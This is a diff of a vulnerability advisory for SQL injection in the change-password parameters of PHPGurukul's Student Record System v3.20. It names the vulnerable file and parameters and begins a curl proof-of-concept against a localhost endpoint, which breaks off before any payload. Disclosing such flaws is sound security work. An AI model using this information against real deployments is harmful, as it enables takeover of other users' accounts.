@@ -1,22 +1,24 @@
+# SQL Injection in Student Record System Using PHP and MySQL v3.20
 
 - Vendor : PHPGurukul
 - Product : Student Record System Using PHP and MySQL
 - Version : 3.20
 - Official Website: https://phpgurukul.com/student-record-system-php/
 
-Related Code file: change-password.php
-Injection parameter: currentpassword, newpassword
+- Related Code file: change-password.php
+- Injection parameter: currentpassword, newpassword
 
 ## Vulnerability Description
 The vulnerability is SQL Injection in Student Record System Using PHP and MySQL version 3.20
 The currentpassword, newpassword parameters are vulnerable to SQL Injection when changing to a new password.
 This vulnerability allows an attacker to inject a SQL query into the currentpassword, newpassword parameters to change the password of another user.
+
 #### Impact Assessment 
 This vulnerability allows an authenticated attacker to manipulate SQL queries during the password change process, potentially leading to:
 - Unauthorized password changes for other user accounts
 
-Affected Endpoint : http://127.0.0.1:8888/change-password.php
-PoC : ```
+- Affected Endpoint : http://127.0.0.1:8888/change-password.php
+- PoC : ```
 ```
 curl -i -s -k -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
